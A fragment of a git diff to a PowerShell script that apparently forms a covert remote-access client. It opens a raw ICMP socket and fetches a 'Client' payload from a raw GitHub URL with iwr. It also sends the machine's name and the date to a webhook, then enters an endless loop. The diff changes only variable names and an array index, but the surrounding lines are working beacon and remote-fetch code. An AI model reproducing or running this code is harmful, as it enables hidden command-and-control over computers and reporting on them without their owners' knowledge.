@@ -135,7 +135,7 @@ class Icmp {
     }
 }
 $SendingIP = "0.0.0.0"
-$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
+$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
 $icmp = [Icmp]::new()
 $icmp.InitAll(20, $SendingIP, $BindingIP, "InterNetwork", "Raw", "Icmp")
 
@@ -149,9 +149,9 @@ $Updt = @{
     "ComputerName" = "$($env:ComputerName)"
     "Date"         = "$(Get-Date)"
 }
-$Hl = [Haul]::new()
-$Hl.sdwk(((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content))
-$Hl.jWebhook($Updt)
+$Haul = [Haul]::new()
+$Haul.sdwk(((iwr https://raw.githubusercontent.com/jh1sc/Conex/main/Client).content))
+$Haul.jWebhook($Updt)
 
 
 while ($true) {
